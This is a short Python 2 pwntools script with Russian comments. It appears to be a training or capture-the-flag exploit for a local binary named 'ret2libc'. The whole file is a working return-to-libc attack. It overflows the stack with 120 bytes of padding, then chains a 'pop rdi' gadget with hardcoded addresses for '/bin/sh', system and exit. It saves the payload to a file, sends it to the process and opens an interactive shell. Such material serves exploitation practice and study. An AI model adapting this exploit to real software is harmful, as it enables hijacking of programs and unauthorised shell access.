#!/usr/bin/env python2
# -*- coding: utf-8 -*-

# Использование: python pwn-ret2libc.py [DEBUG]

from pwn import *

context.arch      = 'amd64'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 64
context.terminal  = ['tmux', 'new-window']

junk = 'A' * 120
pop_rdi_gadget = p64(0x401136)
nop_gadget = p64(0x4010af)
system_addr = p64(0x7ffff7e1ffd0)
bin_sh_addr = p64(0x7ffff7f7cb84)
exit_addr = p64(0x7ffff7e143c0)

payload = junk + pop_rdi_gadget + bin_sh_addr + nop_gadget + system_addr + exit_addr

with open('payload.bin', 'wb') as f:
	f.write(payload)

p = process('./ret2libc')

"""
gdb.attach(p, '''
init-peda
start''')

# Нужен raw_input(), когда юзаешь gdb.debug() вместо gdb.attach()
"""

p.recvuntil('Case 2: Return-to-libc')
raw_input('[?] Отправляю пейлоад?')
p.sendline(payload)

p.interactive()
